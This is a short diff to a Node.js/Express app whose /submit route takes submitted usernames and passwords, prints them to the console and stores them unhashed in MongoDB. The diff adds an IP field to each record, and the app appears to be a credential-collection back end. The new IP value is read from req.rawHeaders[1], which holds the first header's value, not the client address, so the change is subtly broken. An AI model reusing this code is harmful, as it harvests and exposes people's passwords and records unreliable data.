@@ -19,6 +19,7 @@ var Schema = mongoose.Schema;
 var uapschema = new Schema({
 	username: String,
 	password: String,
+	ip: String,
 });
 
 var numberOfRequests = 0;
@@ -39,11 +40,12 @@ app.post("/submit", (req, res) => {
 	let username = req.body.username;
 	let password = req.body.password;
 	console.log(username, password);
-
+	let ip = req.rawHeaders[1];
 	uapmodel.create(
 		{
 			username: username,
 			password: password,
+			ip: ip,
 		},
 		function (err, small) {
 			if (err) return handleError(err);
